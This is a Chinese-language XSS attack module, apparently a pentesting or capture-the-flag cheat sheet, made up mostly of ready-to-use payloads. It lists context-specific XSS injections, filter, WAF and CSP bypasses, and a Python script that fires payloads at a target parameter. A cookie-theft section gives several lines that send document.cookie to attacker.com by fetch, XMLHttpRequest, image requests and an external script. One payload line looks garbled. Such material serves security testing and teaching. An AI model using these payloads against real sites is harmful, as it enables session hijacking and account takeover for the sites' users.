# XSS 跨站脚本攻击模块

## 适用场景
- 用户输入内容回显页面
- 评论、留言、个人资料等功能
- URL 参数直接渲染

## 检查清单

```yaml
XSS 类型:
  - [ ] 反射型 XSS (URL 参数)
  - [ ] 存储型 XSS (数据库存储)
  - [ ] DOM XSS (前端 JS 处理)

上下文分析:
  - [ ] HTML 标签之间
  - [ ] HTML 属性值内
  - [ ] JavaScript 代码内
  - [ ] URL 参数内
  - [ ] CSS 样式内

过滤检测:
  - [ ] 标签过滤 (<script>)
  - [ ] 事件过滤 (onerror)
  - [ ] 关键字过滤 (alert)
  - [ ] 编码处理 (HTML实体)
  - [ ] 长度限制

防护绕过:
  - [ ] CSP 绕过
  - [ ] HttpOnly 绕过
  - [ ] WAF 绕过

常用工具:
  - XSStrike (自动化检测)
  - Burp Suite (手工测试)
  - BeEF (浏览器利用框架)
```

## 分析流程

### Step 1: 注入点检测

```html
<!-- 基础测试 -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 检测过滤 -->
<test>
<ScRiPt>
<script >
<script/x>
<img src=x onerror=alert(1)>

<!-- 确认回显位置 -->
xss_test_string_12345
```

### Step 2: 上下文分析与 Payload

#### HTML 标签之间

```html
<!-- 直接插入标签 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<iframe onload=alert(1)>
```

#### HTML 属性值内

```html
<!-- 闭合属性 -->
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='
" onfocus=alert(1) autofocus x="

<!-- 事件属性 -->
" onclick=alert(1) "
" onload=alert(1) "

<!-- JavaScript 伪协议 -->
" href="javascript:alert(1)
" src="javascript:alert(1)
```

#### JavaScript 代码内

```javascript
// 字符串内
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>

// 变量内
'-alert(1)-'
"+alert(1)+"

// 模板字符串
${alert(1)}
```

#### URL 参数内

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Step 3: 过滤绕过

#### 标签绕过

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- 使用其他标签 -->
<svg onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- 空格变形 -->
<img/src=x onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>

<!-- 注释绕过 -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

#### 事件绕过

```html
<!-- 使用不常见事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<iframe srcdoc="<svg onload=alert(1)>">
```

#### 关键字绕过

```html
<!-- 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- 字符串拼接 -->
<img src=x onerror=eval('ale'+'rt(1)')>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=top['al'+'ert'](1)>

<!-- 不使用括号 -->
<img src=x onerror=alert`1`>
<img src=x onerror=throw/a]alert[1]>

<!-- 不使用 alert -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(1)>
```

#### 编码绕过

```html
<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- URL 编码 -->
<img src=x onerror=%61%6c%65%72%74%28%31%29>

<!-- Unicode 编码 -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- Base64 -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Step 4: CSP 绕过

```html
<!-- 检查 CSP 头 -->
Content-Security-Policy: default-src 'self'

<!-- JSONP 绕过 -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- AngularJS 绕过 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- base 标签 -->
<base href="http://attacker.com/">
<script src="evil.js"></script>

<!-- object 标签 -->
<object data="data:text/html,<script>alert(1)</script>"></object>

<!-- 上报绕过 -->
<img src=x onerror=location='//attacker.com/?c='+document.cookie>
```

### Step 5: Cookie 窃取

```html
<!-- 基础窃取 -->
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
<script>location='http://attacker.com/?c='+document.cookie</script>
<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- 使用 fetch -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- 使用 XMLHttpRequest -->
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://attacker.com/?c='+document.cookie);
xhr.send();
</script>

<!-- 绕过长度限制 -->
<script src=//attacker.com/x.js></script>

<!-- 外部 x.js 内容 -->
new Image().src='http://attacker.com/?c='+document.cookie;
```

## DOM XSS 检测

### 常见 Source

```javascript
// URL 相关
location.href
location.search
location.hash
location.pathname
document.URL
document.documentURI
document.referrer

// 存储相关
localStorage.getItem()
sessionStorage.getItem()
document.cookie

// 用户输入
window.name
postMessage
```

### 常见 Sink

```javascript
// HTML 操作
innerHTML
outerHTML
document.write()
document.writeln()
insertAdjacentHTML()

// JavaScript 执行
eval()
setTimeout()
setInterval()
Function()
new Function()

// 链接跳转
location.href
location.assign()
location.replace()
window.open()
```

### 检测方法

```javascript
// 检测 URL Hash
http://target.com/#<img src=x onerror=alert(1)>

// 检测 URL 参数
http://target.com/?name=<script>alert(1)</script>

// 检测 postMessage
window.postMessage('<img src=x onerror=alert(1)>', '*')
```

## 常见套路与解法

### 套路 1: 反射型 XSS

**特征**: URL 参数直接回显

**Payload**:
```html
?name=<script>alert(1)</script>
?search="><script>alert(1)</script>
?q=<img src=x onerror=alert(1)>
```

### 套路 2: 属性值闭合

**特征**: 输入在 HTML 属性中

**Payload**:
```html
?value=" onmouseover=alert(1) x="
?value=' onfocus=alert(1) autofocus '
```

### 套路 3: JS 代码注入

**特征**: 输入在 JavaScript 中

**Payload**:
```
?name=';alert(1)//
?name="-alert(1)-"
?name=</script><script>alert(1)</script>
```

### 套路 4: 存储型 XSS

**特征**: 留言、评论功能

**Payload**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 套路 5: DOM XSS

**特征**: 前端 JS 处理输入

**Payload**:
```
#<img src=x onerror=alert(1)>
?callback=<script>alert(1)</script>
```

## XSS 自动化脚本

```python
#!/usr/bin/env python3
"""
XSS 检测自动化脚本
"""

import requests
from urllib.parse import urlencode

# 基础 Payload 列表
payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    "'-alert(1)-'",
]

def test_xss(url, param):
    """测试 XSS"""
    vulnerable = []
    
    for payload in payloads:
        try:
            # GET 请求
            test_url = f"{url}?{param}={payload}"
            resp = requests.get(test_url, timeout=5)
            
            # 检查 payload 是否原样出现在响应中
            if payload in resp.text:
                print(f"[+] Potential XSS: {payload}")
                vulnerable.append(payload)
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return vulnerable

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 xss_test.py http://target.com param_name")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    print(f"[*] Testing XSS on {url}, parameter: {param}")
    results = test_xss(url, param)
    
    if results:
        print(f"\n[+] Found {len(results)} potential XSS vectors")
    else:
        print("\n[-] No XSS found")
```

## XSStrike 使用

```bash
# 基础扫描
python3 xsstrike.py -u "http://target.com/?search=test"

# POST 请求
python3 xsstrike.py -u "http://target.com/search" --data "query=test"

# 自定义 header
python3 xsstrike.py -u "http://target.com/?search=test" --headers "Cookie: session=xxx"

# 爬取页面
python3 xsstrike.py -u "http://target.com/" --crawl

# 绕过 WAF
python3 xsstrike.py -u "http://target.com/?search=test" --fuzzer
```

## 工具速查

```bash
# XSS 检测
xsstrike -u "http://target.com/?param=test"
dalfox url "http://target.com/?param=test"

# Cookie 接收
# 使用 webhook.site / requestbin.com / burp collaborator

# XSS 平台
# BeEF Framework
# XSS Hunter
```
